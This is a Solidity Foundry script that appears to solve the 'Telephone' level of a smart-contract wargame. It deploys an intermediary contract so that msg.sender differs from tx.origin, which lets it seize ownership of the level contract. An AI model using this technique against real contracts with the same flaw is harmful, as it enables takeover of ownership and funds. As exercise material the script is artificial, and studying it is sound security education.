// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/level4.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

/// @notice tx.origin
contract Level4Solution is Script {
    Telephone public level = Telephone(0x6DE0748B498D6B95eb386225D85360e4A6544D0A);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        
        new changeMsgSender(vm.envAddress("MY_ADDRESS"), level);
        vm.stopBroadcast();
    }
    

}

contract changeMsgSender{
    constructor(address _address, Telephone level){
        level.changeOwner(_address);

        address owner = level.owner();
        console.log("owner: ", owner);
    }

}
